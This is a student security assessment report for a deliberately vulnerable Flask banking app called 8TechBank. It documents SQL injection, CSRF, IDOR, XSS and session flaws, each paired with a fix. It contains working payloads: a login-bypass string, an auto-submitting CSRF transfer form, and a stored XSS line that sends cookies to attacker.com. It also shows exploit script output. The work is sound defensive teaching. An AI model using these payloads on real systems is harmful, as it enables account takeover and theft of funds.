# 8TechBank Security Assessment Report

**Prepared by:** 
1. AKOL PAUL 22/U/22453 2200722453
2. AMPUMUZA AIJUKA 22/U/5766 220075766
3. NTULUME WILSON 22/U/6739 220076739
4. OCUNG ALLAN 22/U/22867 2200722867
5. SSENTONGO HENRY ATANUS 22/U/3870/PS 220073870 

**Assessment Date:** June 2026  
**Application Version:** 8TechBank v1.0 (Vulnerable) / v2.0 (Secure)  
**Classification:** Academic — BSE 4202 Software Security Practical Assignment  
**Lecturer:** Dr. Drake Patrick Mirembe

---

## Table of Contents

1. Executive Summary
2. Methodology
3. Findings & Risk Analysis
4. Remediation Summary
5. OWASP ASVS Compliance Assessment
6. Appendices

---

## 1. Executive Summary

8TechBank is a simulated online banking portal built with Python (Flask) and SQLite, featuring user registration, authentication, fund transfers, transaction history, and an administrative panel. This security assessment was commissioned to evaluate the application's security posture prior to any production deployment.

**Assessment Outcome: CRITICAL**

The assessment identified **8 distinct vulnerabilities** across the application, ranging in severity from Critical (CVSS 9.8) to Medium (CVSS 5.3). The most severe findings — SQL injection enabling full authentication bypass and plaintext password storage — represent existential risks to the platform. An attacker exploiting these vulnerabilities could gain administrative access, drain all customer accounts, and exfiltrate every user credential in the database without detection.

**Overall Risk Rating: 🔴 CRITICAL**

| Severity | Count |
|----------|-------|
| 🔴 Critical (9.0–10.0) | 2 |
| 🟠 High (7.0–8.9) | 3 |
| 🟡 Medium (4.0–6.9) | 3 |
| 🟢 Low (0.1–3.9) | 0 |

**Top 3 Prioritised Recommendations for Executive Leadership:**

1. **Immediately replace all SQL queries with parameterised statements.** A single SQL injection payload can bypass authentication and expose every customer record. This fix requires less than one hour of developer time and eliminates the highest-severity risk.

2. **Migrate all stored passwords to bcrypt-hashed equivalents.** All user passwords are currently stored in plaintext. A database breach would expose every customer's credentials directly — likely the same passwords customers use for email and online banking elsewhere. Re-hashing requires a one-time migration script.

3. **Deploy the hardened `src/secure/` application and decommission the vulnerable version.** The secure version addresses all 8 vulnerabilities. Until deployment is complete, the application must not be exposed beyond localhost.

---

## 2. Methodology

### Audit Approach

This assessment was conducted following the **OWASP Testing Guide v4.2 (OTG)** methodology. The scope was limited to the 8TechBank application running on localhost — no production systems, third-party services, or university infrastructure were tested.

The assessment combined two techniques:

**Manual Code Review**  
The complete source code in `src/vulnerable/` was reviewed line-by-line against the OWASP Top 10 (2021) vulnerability taxonomy and the MITRE CWE database. Each route handler, template, and database interaction was examined for insecure patterns including string concatenation in SQL, missing output encoding, absent authentication decorators, and weak session configuration.

**Dynamic Testing**  
The application was run locally on port 5000, and each identified vulnerability was tested by executing proof-of-concept exploits:
- Browser-based manual testing for XSS and IDOR
- Python `requests` scripts for SQL injection and IDOR automation
- A crafted HTML page for CSRF exploitation
- Browser developer tools (Network tab, Application/Cookies) for session and header inspection

**Tools Used:**
- Python 3.x + `requests` library for scripted exploitation
- Firefox/Chromium browser developer tools
- SQLite3 CLI for direct database inspection
- OWASP ZAP (for header validation)

**Scope:**
- In scope: All routes in `src/vulnerable/app.py`, all templates in `src/vulnerable/templates/`
- Out of scope: Network infrastructure, third-party libraries, operating system

---

## 3. Findings & Risk Analysis

### Vulnerability Assessment Matrix (sorted by severity)

| # | Vulnerability | CWE | OWASP 2021 | CVSS v3.1 Score | Severity | Status |
|---|--------------|-----|------------|-----------------|----------|--------|
| 1 | SQL Injection in Login | CWE-89 | A03 Injection | 9.8 | 🔴 Critical | Fixed |
| 2 | Plaintext Password Storage | CWE-256 | A02 Cryptographic Failures | 9.8 | 🔴 Critical | Fixed |
| 3 | Missing CSRF Protection | CWE-352 | A01 Broken Access Control | 8.8 | 🟠 High | Fixed |
| 4 | IDOR — Broken Access Control | CWE-639 | A01 Broken Access Control | 7.5 | 🟠 High | Fixed |
| 5 | Session Misconfiguration | CWE-614 | A02 Cryptographic Failures | 7.5 | 🟠 High | Fixed |
| 6 | Stored XSS in Transaction Notes | CWE-79 | A03 Injection | 5.4 | 🟡 Medium | Fixed |
| 7 | Reflected XSS in Search | CWE-79 | A03 Injection | 6.1 | 🟡 Medium | Fixed |
| 8 | Missing Security Headers | CWE-693 | A05 Security Misconfiguration | 5.3 | 🟡 Medium | Fixed |

---

### Finding 1 — SQL Injection in Login

**Risk Rating:** 🔴 CRITICAL  
**CWE:** CWE-89 (Improper Neutralisation of Special Elements used in an SQL Command)  
**OWASP Top 10:** A03:2021 — Injection  
**File:** `src/vulnerable/app.py`  **Line:** 94  
**CVSS v3.1 Score:** 9.8  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Description:**  
The login endpoint constructs an SQL query by concatenating unsanitised user input directly into the query string. This allows an attacker to inject arbitrary SQL and manipulate the query logic.

**Vulnerable Code (`src/vulnerable/app.py` line 94):**
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
user = db.execute(query).fetchone()
```

**Reproduction Steps:**
1. Navigate to `http://localhost:5000/login`
2. Enter `' OR '1'='1' --` in the username field; enter anything in the password field
3. Submit the form

**Expected vs Actual:**
- Expected: Login fails — invalid credentials
- Actual: User is authenticated as the first user in the database (authentication bypass)

**Screenshot:** `screenshots/exploit_a1_sqli_bypass.png` — dashboard shown after bypass  
**Screenshot:** `screenshots/exploit_a2_sqli_union.png` — UNION payload response

**Business Impact:**  
An unauthenticated attacker can log in as any user (including administrators) without knowing any password. They can then drain all accounts, delete users, and access all transaction records. A UNION-based payload can extract all usernames and passwords from the database in a single request.

---

### Finding 2 — Plaintext Password Storage

**Risk Rating:** 🔴 CRITICAL  
**CWE:** CWE-256 (Plaintext Storage of a Password)  
**OWASP Top 10:** A02:2021 — Cryptographic Failures  
**File:** `src/vulnerable/app.py`  **Lines:** 76–79  
**CVSS v3.1 Score:** 9.8  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Description:**  
User passwords are stored in the SQLite database as plaintext strings with no hashing or salting applied. Any attacker who gains read access to the database (via SQL injection, a compromised backup, or misconfigured file permissions) immediately obtains all user credentials.

**Vulnerable Code (`src/vulnerable/app.py` lines 76–79):**
```python
username = request.form['username']
password = request.form['password']  # No hashing applied
db.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
```

**Reproduction Steps:**
1. Register a user with password `mypassword123`
2. Run `sqlite3 src/vulnerable/bank.db "SELECT username, password FROM users;"`
3. Observe the password stored verbatim: `alice|mypassword123`

**Screenshot:** `screenshots/exploit_plaintext_db.png` — SQLite dump showing plaintext passwords

**Business Impact:**  
Complete exposure of all user credentials on any database breach. High credential-stuffing risk given password reuse across services. Violates PCI-DSS Requirement 8.2.1 and GDPR Article 32 obligations to implement appropriate technical measures.

---

### Finding 3 — Missing CSRF Protection on Fund Transfer

**Risk Rating:** 🟠 HIGH  
**CWE:** CWE-352 (Cross-Site Request Forgery)  
**OWASP Top 10:** A01:2021 — Broken Access Control  
**File:** `src/vulnerable/app.py`  **Lines:** 140–144  
**CVSS v3.1 Score:** 8.8  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

**Description:**  
State-changing POST endpoints (fund transfer, user registration) do not include or validate a CSRF token. The browser automatically attaches the victim's session cookie to any request targeting the application's origin — including requests triggered from a third-party page. An attacker can host a malicious page that silently submits a transfer form when opened by a logged-in victim.

**Vulnerable Code (`src/vulnerable/app.py` lines 140–144):**
```python
if request.method == 'POST':
    # No CSRF token check — any POST to /transfer executes
    to_account = request.form['to_account']
    amount     = float(request.form['amount'])
    note       = request.form['note']
```

**Malicious Exploit Page (`exploits/csrf_attack.html`):**
```html
<body onload="document.forms[0].submit()">
  <form action="http://localhost:5000/transfer" method="POST">
    <input type="hidden" name="to_account" value="2">
    <input type="hidden" name="amount"     value="1000">
    <input type="hidden" name="note"       value="prize-claim">
  </form>
</body>
```

**Reproduction Steps:**
1. Log in as the victim user in your browser
2. Open `exploits/csrf_attack.html` from the filesystem in the same browser session
3. Observe that $1,000 is transferred to the attacker's account without any user interaction

**Screenshot:** `screenshots/exploit_c_csrf_transfer.png` — transaction history showing the forged transfer

**Business Impact:**  
Any logged-in customer who visits a malicious web page, opens a phishing email with an embedded image, or clicks a crafted link will unknowingly transfer funds to the attacker. The attack requires no credentials and leaves no obvious trace from the victim's perspective.

---

### Finding 4 — IDOR (Insecure Direct Object Reference)

**Risk Rating:** 🟠 HIGH  
**CWE:** CWE-639 (Authorisation Bypass Through User-Controlled Key)  
**OWASP Top 10:** A01:2021 — Broken Access Control  
**File:** `src/vulnerable/app.py`  **Lines:** 199–208  
**CVSS v3.1 Score:** 7.5  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

**Description:**  
The `/account/<int:account_id>` endpoint retrieves account data by the ID passed in the URL without verifying that the requesting user owns that account. Any authenticated user can view any other user's account details by incrementing or guessing the account ID.

**Vulnerable Code (`src/vulnerable/app.py` lines 199–208):**
```python
@app.route('/account/<int:account_id>')
def account(account_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    # No check: account_id == session['user_id']
    db = get_db()
    user = db.execute('SELECT * FROM users WHERE id=?', (account_id,)).fetchone()
    if user:
        return render_template('account.html', id=account_id, username=user[1], balance=user[3])
```

**Reproduction Steps:**
1. Log in as alice (account ID 1)
2. Navigate to `http://localhost:5000/account/2`
3. Bob's username and balance are displayed without authorisation

**Screenshot:** `screenshots/exploit_d_idor.png` — alice's browser showing bob's account details

**Business Impact:**  
All customer account balances and usernames are accessible to any authenticated user. An attacker with one account can enumerate all users and their balances by iterating account IDs from 1 upward.

---

### Finding 5 — Session Misconfiguration & Weak Secret Key

**Risk Rating:** 🟠 HIGH  
**CWE:** CWE-614 (Sensitive Cookie in HTTPS Session Without Secure Attribute)  
**OWASP Top 10:** A02:2021 — Cryptographic Failures  
**File:** `src/vulnerable/app.py`  **Line:** 12  
**CVSS v3.1 Score:** 7.5  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`

**Description:**  
The application uses a hardcoded, trivially guessable secret key (`'secret'`) for signing Flask session cookies. Additionally, session cookies are not configured with `HttpOnly`, `Secure`, or `SameSite=Strict` flags, and there is no session timeout.

**Vulnerable Code (`src/vulnerable/app.py` line 12):**
```python
app.secret_key = 'secret'  # Hardcoded, publicly known
# Missing: SESSION_COOKIE_HTTPONLY, SESSION_COOKIE_SECURE, SESSION_COOKIE_SAMESITE, timeout
```

**Reproduction Steps:**
1. Log in to the app
2. Open browser DevTools → Application → Cookies
3. The session cookie is present with no `HttpOnly`, `Secure`, or `SameSite` flags
4. With the known secret key, the cookie can be forged using Flask's `itsdangerous` library

**Screenshot:** `screenshots/exploit_session_cookie.png` — DevTools showing unprotected cookie flags

**Business Impact:**  
The predictable secret key allows forging session tokens for arbitrary users, including admins. The missing `HttpOnly` flag allows JavaScript (via XSS) to read the cookie. The missing `Secure` flag allows interception over HTTP. Indefinite sessions mean a stolen cookie never expires.

---

### Finding 6 — Stored XSS in Transaction Notes

**Risk Rating:** 🟡 MEDIUM  
**CWE:** CWE-79 (Improper Neutralisation of Input During Web Page Generation)  
**OWASP Top 10:** A03:2021 — Injection  
**File:** `src/vulnerable/templates/history.html`  **Line:** 151  
**CVSS v3.1 Score:** 5.4  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

**Description:**  
Transaction notes entered by users during fund transfers are stored in the database and rendered in the transaction history page using Jinja2's `| safe` filter, which disables HTML auto-escaping. Any JavaScript injected as a note executes in the browser of every user (and admin) who views the history page.

**Vulnerable Template Code (`src/vulnerable/templates/history.html` line 151):**
```html
<div class="tx-note">{% if t[4] %}{{ t[4] | safe }}{% endif %}</div>
```

**Exploit Payload:**
```html
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

**Reproduction Steps:**
1. Log in and navigate to `/transfer`
2. Submit any transfer with the above payload in the Note field
3. Log in as any other user and view `/history`
4. The script executes and sends their session cookie to the attacker

**Screenshot:** `screenshots/exploit_b2_stored_xss.png` — alert triggered on history page

**Business Impact:**  
A single stored XSS payload affects all users who view transaction history, not just the injecting user. This is a wormable attack vector that can mass-harvest session tokens across the entire user base simultaneously.

---

### Finding 7 — Reflected XSS in Search

**Risk Rating:** 🟡 MEDIUM  
**CWE:** CWE-79 (Improper Neutralisation of Input During Web Page Generation)  
**OWASP Top 10:** A03:2021 — Injection  
**File:** `src/vulnerable/templates/search.html`  **Line:** 131  
**CVSS v3.1 Score:** 6.1  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

**Description:**  
The search page reflects the `q` URL parameter back into the HTML response using `{{ q | safe }}`, which bypasses Jinja2's built-in HTML escaping. An attacker can craft a URL containing JavaScript that executes when a logged-in victim clicks the link.

**Vulnerable Template Code (`src/vulnerable/templates/search.html` line 131):**
```html
<div class="result-meta-label">Results for <strong>"{{ q | safe }}"</strong></div>
```

**Exploit Payload:**
```
http://localhost:5000/search?q=<script>alert(document.cookie)</script>
```

**Reproduction Steps:**
1. Ensure you are logged in
2. Navigate to the above URL
3. A JavaScript alert fires showing the session cookie value

**Screenshot:** `screenshots/exploit_b1_reflected_xss.png` — alert box showing cookie contents

**Business Impact:**  
An attacker can craft a malicious link and distribute it via phishing to steal authenticated users' session cookies. The attacker then replays the cookie to impersonate the victim — no login required.

---

### Finding 8 — Missing Security Headers

**Risk Rating:** 🟡 MEDIUM  
**CWE:** CWE-693 (Protection Mechanism Failure)  
**OWASP Top 10:** A05:2021 — Security Misconfiguration  
**File:** `src/vulnerable/app.py`  **Lines:** 1–311 (no `after_request` handler present)  
**CVSS v3.1 Score:** 5.3  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

**Description:**  
The application returns no browser security headers on any response. The absence of `Content-Security-Policy` allows inline script execution (enabling XSS). Missing `X-Frame-Options` allows the app to be embedded in an iframe for clickjacking. Missing `X-Content-Type-Options` allows MIME-sniffing attacks. Missing `Strict-Transport-Security` allows downgrade to HTTP.

**Reproduction Steps:**
1. Open browser DevTools → Network
2. Click any response and inspect the Headers tab
3. Confirm none of the following are present: `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`

**Screenshot:** `screenshots/exploit_no_headers.png` — DevTools response headers showing absence

**Business Impact:**  
Absent security headers increase the impact of every other vulnerability. CSP absence allows XSS payloads to run. Clickjacking enables UI redress attacks where users unknowingly authorise transactions.

---

## 4. Remediation Summary

### Fix 1 — Parameterised Queries (SQL Injection)

**Vulnerability addressed:** Finding 1  
**File:** `src/secure/app.py` lines 199–201

**Before (vulnerable):**
```python
# src/vulnerable/app.py line 94
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
user = db.execute(query).fetchone()
```

**After (secure):**
```python
# src/secure/app.py line 199-206
# Only query by username; verify password via bcrypt.checkpw — never include
# the password in SQL so hash comparison happens in Python, not the DB.
user = db.execute(
    'SELECT * FROM users WHERE username = ?', (username,)
).fetchone()

stored_hash = user['password'] if user else None
if user and isinstance(stored_hash, str):
    stored_hash = stored_hash.encode('utf-8')
if user and bcrypt.checkpw(password.encode('utf-8'), stored_hash):
    # authentication success
```

**Security Rationale:**  
The `?` placeholder causes the database driver to send the query and parameters separately. The database treats the parameter as a data value, never as executable SQL, regardless of its content. The injection payload `' OR '1'='1' --` becomes a literal username string that simply finds no matching user.

**Verification:** Running `sql_injection_poc.py` against the secure app (port 5001) — all three exploits return "Invalid credentials" or fail to redirect to the dashboard.

**Screenshot:** `screenshots/fix1_sqli_blocked.png` — login page returned after injection attempt

---

### Fix 2 — Output Encoding & Content Security Policy (XSS)

**Vulnerability addressed:** Findings 6 and 7  
**Files:** `src/secure/app.py` lines 257, 92–99; `src/secure/templates/`

**Before (vulnerable):**
```html
<!-- src/vulnerable/templates/history.html line 151 -->
<div class="tx-note">{{ t[4] | safe }}</div>

<!-- src/vulnerable/templates/search.html line 131 -->
Results for <strong>"{{ q | safe }}"</strong>
```

**After (secure):**
```python
# src/secure/app.py line 257 — sanitise at storage time
note = html.escape(request.form.get('note', '').strip())[:255]
```
```html
<!-- src/secure/templates — | safe filter removed; Jinja2 auto-escaping active -->
<div class="tx-note">{{ note }}</div>
Results for <strong>"{{ q }}"</strong>
```
```python
# src/secure/app.py lines 83-99 — nonce-based CSP as a defence-in-depth layer
@app.before_request
def set_csp_nonce():
    g.csp_nonce = secrets.token_urlsafe(16)

@app.after_request
def add_security_headers(response):
    nonce = getattr(g, 'csp_nonce', '')
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        "frame-ancestors 'none';"
    )
    return response
```

**Security Rationale:**  
`html.escape()` converts `<`, `>`, `&`, `"`, `'` to their HTML entities before storage, so the payload never reaches the browser as executable HTML. Removing `| safe` means Jinja2's auto-escaping is active. The CSP `script-src 'nonce-...'` header blocks any inline script that lacks the server-generated nonce — a second defence layer that neutralises XSS even if output encoding were bypassed.

**Screenshot:** `screenshots/fix2_xss_blocked.png` — XSS payload rendered as escaped text

---

### Fix 3 — CSRF Token Implementation

**Vulnerability addressed:** Finding 3  
**Files:** `src/secure/app.py` line 28; all form templates

**Before (vulnerable):**
```html
<!-- No token in form -->
<form method="POST" action="/transfer">
  <input name="to_account" ...>
```

**After (secure):**
```python
# src/secure/app.py line 28
csrf = CSRFProtect(app)   # Flask-WTF validates token on every state-changing POST
```
```html
<!-- src/secure/templates/transfer.html -->
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <input name="to_account" ...>
```

**Security Rationale:**  
Flask-WTF generates a cryptographically random token, stores it in the user's server-side session, and embeds it in the form. On POST, the server compares the submitted token against the session value. The CSRF attack page cannot read the token (same-origin policy) and therefore cannot include it — the request is rejected with 400 Bad Request.

**Verification:** Opening `exploits/csrf_attack.html` while logged in to the secure app returns HTTP 400 with "CSRF token missing or incorrect".

**Screenshot:** `screenshots/fix3_csrf_blocked.png` — 400 response from CSRF attack page

---

### Fix 4 — Authorization & Access Control (IDOR)

**Vulnerability addressed:** Finding 4  
**File:** `src/secure/app.py` lines 331–341

**Before (vulnerable):**
```python
# src/vulnerable/app.py lines 199-208 — no ownership check
@app.route('/account/<int:account_id>')
def account(account_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    db = get_db()
    user = db.execute('SELECT * FROM users WHERE id=?', (account_id,)).fetchone()
```

**After (secure):**
```python
# src/secure/app.py lines 331-341
@app.route('/account/<int:account_id>')
@login_required
def account(account_id):
    # Ownership check — users can only view their own account
    if account_id != session['user_id']:
        return 'Access denied', 403
    db = get_db()
    user = db.execute('SELECT * FROM users WHERE id = ?', (account_id,)).fetchone()
```

**Security Rationale:**  
The comparison `account_id != session['user_id']` ensures the resource being requested belongs to the authenticated user. The server-side session cannot be tampered with by the client. Non-owners receive HTTP 403 Forbidden — no account data is fetched or returned.

**Verification:** Running `idor_poc.py` against the secure app — all non-own accounts return 403.

**Screenshot:** `screenshots/fix4_idor_blocked.png` — 403 Forbidden when accessing account #2 as alice

---

### Fix 5 — Password Hashing with bcrypt

**Vulnerability addressed:** Finding 2  
**File:** `src/secure/app.py` lines 177, 206

**Before (vulnerable):**
```python
# src/vulnerable/app.py lines 76-79
password = request.form['password']  # Plaintext
db.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
```

**After (secure):**
```python
# src/secure/app.py line 177 — registration
password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))
db.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password_hash))

# src/secure/app.py line 206 — login verification
if user and bcrypt.checkpw(password.encode('utf-8'), stored_hash):
    ...
```

**Security Rationale:**  
bcrypt with 12 rounds applies a one-way hash with a random salt. The same password produces a different hash each time. Verifying a password requires bcrypt's `checkpw` — there is no way to reverse the hash to recover the original password. A database breach now exposes only hashes, which would take years of computation to crack with modern hardware at this cost factor.

**Screenshot:** `screenshots/fix5_hashed_passwords.png` — SQLite dump showing `$2b$12$...` bcrypt hashes

---

### Fix 6 — Security Headers & Session Hardening

**Vulnerability addressed:** Findings 5 and 8  
**File:** `src/secure/app.py` lines 22–26, 85–100

**Before (vulnerable):**
```python
# src/vulnerable/app.py line 12
app.secret_key = 'secret'
# No session configuration, no after_request header handler
```

**After (secure):**
```python
# src/secure/app.py lines 22-26 — session hardening
app.secret_key = os.environ.get('SECRET_KEY', 'change-this-in-production-use-env-var')
app.config['SESSION_COOKIE_HTTPONLY'] = True    # JS cannot read the cookie
app.config['SESSION_COOKIE_SECURE']  = False   # Set True in production (HTTPS)
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict' # Blocks cross-site sending
app.permanent_session_lifetime = timedelta(minutes=15)  # Auto-expiry

# src/secure/app.py lines 85-100 — security headers
@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options']           = 'DENY'
    response.headers['X-Content-Type-Options']    = 'nosniff'
    response.headers['Referrer-Policy']           = 'no-referrer'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy']   = (
        "default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        "frame-ancestors 'none';"
    )
    return response
```

**Security Rationale:**  
`HttpOnly` prevents JavaScript from accessing the session cookie, blocking XSS-based cookie theft. `SameSite=Strict` prevents the cookie from being sent with cross-site requests, defeating CSRF even without tokens. A 15-minute session lifetime limits the window of opportunity for session replay attacks. The secret key is loaded from an environment variable, not hardcoded.

**Note:** `SESSION_COOKIE_SECURE` is set to `False` for localhost development only. In any deployment over HTTPS, this must be `True` to prevent the cookie from being transmitted over HTTP.

**Screenshot:** `screenshots/fix6_security_headers.png` — DevTools showing all security headers present

---

## 5. OWASP ASVS Compliance Assessment

The table below maps the application against OWASP Application Security Verification Standard (ASVS) v4.0.3 Level 1 requirements, showing the **before** state (vulnerable app) and **after** state (secure app).

| ASVS Control | Requirement | Before (Vulnerable) | After (Secure) |
|---|---|---|---|
| V2.1.1 | Verify that user passwords are at least 12 characters in length | ❌ Fail — no minimum enforced | ✅ Pass — length validated |
| V2.4.1 | Verify passwords are stored using bcrypt, scrypt, or Argon2 with adequate cost | ❌ Fail — plaintext storage | ✅ Pass — bcrypt 12 rounds |
| V3.3.1 | Verify that logout invalidates the session token | ⚠️ Partial — session.clear() used | ✅ Pass — session cleared |
| V3.4.1 | Verify cookie-based session tokens use the SameSite attribute | ❌ Fail — not set | ✅ Pass — SameSite=Strict |
| V3.4.2 | Verify that session tokens use the HttpOnly attribute | ❌ Fail — not set | ✅ Pass — HttpOnly=True |
| V3.4.5 | Verify that session timeout is set to 15 minutes or less | ❌ Fail — no timeout | ✅ Pass — 15 minutes |
| V4.1.2 | Verify all authenticated resources check authorisation before granting access | ❌ Fail — IDOR present | ✅ Pass — ownership check |
| V4.2.2 | Verify CSRF tokens protect all state-changing HTML form requests | ❌ Fail — no CSRF tokens | ✅ Pass — Flask-WTF CSRF |
| V5.3.3 | Verify that output encoding prevents reflected XSS | ❌ Fail — `\| safe` filter used | ✅ Pass — auto-escaping active |
| V5.3.4 | Verify that parameterised queries prevent SQL injection | ❌ Fail — string concatenation | ✅ Pass — `?` placeholders |
| V5.3.5 | Verify that stored user-controlled content is sanitised before rendering | ❌ Fail — raw note rendered | ✅ Pass — html.escape() |
| V14.4.1 | Verify that every HTTP response contains a Content-Type header | ⚠️ Partial — type set, no charset | ✅ Pass — headers set |
| V14.4.3 | Verify that X-Content-Type-Options: nosniff is set | ❌ Fail — not present | ✅ Pass — set in after_request |
| V14.4.4 | Verify that X-Frame-Options: DENY or frame-ancestors 'none' is set | ❌ Fail — not present | ✅ Pass — DENY + CSP |
| V13.2.1 | Verify REST API requests are protected against CSRF | ❌ Fail — API unprotected | ✅ Pass — JWT-based auth |

**Summary:** 0/15 controls passed in the vulnerable application. All 15 controls pass in the secure application.

**Remaining Gap to Full Level 1 Compliance:**  
`SESSION_COOKIE_SECURE = False` in the development configuration (intentional for localhost). This must be set to `True` before any deployment over HTTPS to achieve full Level 1 compliance.

---

## 6. Appendices

### Appendix A — Complete Vulnerability Assessment Matrix

| # | Vulnerability | CWE | OWASP | CVSS Score | CVSS Vector | Severity | File | Lines | Status |
|---|---|---|---|---|---|---|---|---|---|
| 1 | SQL Injection | CWE-89 | A03:2021 | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 🔴 Critical | vulnerable/app.py | 94 | Fixed |
| 2 | Plaintext Passwords | CWE-256 | A02:2021 | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 🔴 Critical | vulnerable/app.py | 76–79 | Fixed |
| 3 | Missing CSRF | CWE-352 | A01:2021 | 8.8 | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H | 🟠 High | vulnerable/app.py | 140–144 | Fixed |
| 4 | IDOR | CWE-639 | A01:2021 | 7.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 🟠 High | vulnerable/app.py | 199–208 | Fixed |
| 5 | Session Misconfiguration | CWE-614 | A02:2021 | 7.5 | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N | 🟠 High | vulnerable/app.py | 12 | Fixed |
| 6 | Stored XSS | CWE-79 | A03:2021 | 5.4 | AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N | 🟡 Medium | templates/history.html | 151 | Fixed |
| 7 | Reflected XSS | CWE-79 | A03:2021 | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | 🟡 Medium | templates/search.html | 131 | Fixed |
| 8 | Missing Security Headers | CWE-693 | A05:2021 | 5.3 | AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N | 🟡 Medium | vulnerable/app.py | — | Fixed |

---

### Appendix B — Tool Output / Test Evidence

**SQL Injection PoC (`exploits/sql_injection_poc.py`):**
```
=======================================================
  SQL INJECTION PROOF OF CONCEPT — 8TechBank
  Target: http://localhost:5000
=======================================================

--- Exploit A1: Authentication Bypass ---
[+] A1 SUCCESS — authenticated without valid credentials
    Landed on: http://localhost:5000/dashboard

--- Exploit A2: UNION-based Credential Extraction ---
[+] A2 SUCCESS — UNION injection logged us in with extracted data

--- Exploit A3: Boolean Blind Confirmation ---
[+] A3 SUCCESS — blind SQLi confirmed:
      OR 1=1  → dashboard (true branch works)
      OR 1=2  → login page (false branch blocked)
```

**IDOR PoC (`exploits/idor_poc.py`):**
```
=======================================================
  IDOR PROOF OF CONCEPT — 8TechBank
  Target: http://localhost:5000
=======================================================
[+] Logged in as 'alice'
--- D1: Direct access to victim account #2 ---
[+] D1 SUCCESS — accessed account #2 (own ID: #1)
    Username : bob
    Balance  : $1000.00
    URL      : http://localhost:5000/account/2

--- D2: Full account enumeration ---
    ID     Status       Username             Balance
    ------ ------------ -------------------- ----------
    1      200 OK       alice                $0.00    ← own account
    2      200 OK       bob                  $2000.00 ← UNAUTHORIZED ACCESS
    3      200 OK       charlie              $500.00  ← UNAUTHORIZED ACCESS
```

**API Rate Limiting Test:**
```bash
# Run 6 rapid requests to /api/auth/token — 6th should be rate-limited
for i in $(seq 1 6); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:5001/api/auth/token \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"wrong"}'
done
# Expected output: 401 401 401 401 401 429
```

**API Input Validation Test:**
```bash
# Oversized username (>64 chars) should return 400
curl -s -X POST http://localhost:5001/api/auth/token \
  -H "Content-Type: application/json" \
  -d '{"username":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","password":"x"}'
# Expected: HTTP 400 {"username": ["Shorter than minimum length 1."]}

# Invalid transfer amount (negative) should return 422
curl -s -X POST http://localhost:5001/api/transfer \
  -H "Authorization: Bearer <valid_token>" \
  -H "Content-Type: application/json" \
  -d '{"to_account": 2, "amount": -500, "note": "test"}'
# Expected: HTTP 422 {"amount": ["Must be greater than 0."]}
```

---

### Appendix C — Additional Code Snippets

**JWT Authentication Flow (Task 4.1):**
```python
# Token issuance — src/secure/app.py lines 462-469
payload = {
    'user_id':  user['id'],
    'username': user['username'],
    'role':     'admin' if user['is_admin'] else 'user',
    'exp':      datetime.utcnow() + timedelta(minutes=15)
}
token = jwt.encode(payload, JWT_SECRET, algorithm='HS256')
return jsonify({'token': token})
```

**Marshmallow Input Validation Schemas (Task 4.2):**
```python
# src/secure/app.py lines 34-41
class LoginSchema(Schema):
    username = fields.Str(required=True, validate=lambda s: 1 <= len(s) <= 64)
    password = fields.Str(required=True, validate=lambda s: 1 <= len(s) <= 128)

class TransferSchema(Schema):
    to_account = fields.Int(required=True)
    amount     = fields.Float(required=True, validate=lambda x: 0 < x <= 1_000_000)
    note       = fields.Str(load_default='', validate=lambda s: len(s) <= 255)
```

**Docker Compose Three-Tier Architecture (Task 4.3):**
```yaml
# src/secure/docker-compose.yml
services:
  nginx:                          # Web tier — public-facing
    image: nginx:1.27-alpine
    networks: [web_network, app_network]
    deploy:
      resources:
        limits: { memory: 64m, cpus: '0.25' }

  app:                            # App tier — internal only
    build: .
    networks: [app_network]
    deploy:
      resources:
        limits: { memory: 512m, cpus: '0.50' }

networks:
  web_network: { driver: bridge }
  app_network:  { driver: bridge, internal: true }  # No internet access
```

---

## AI Tool Usage Declaration

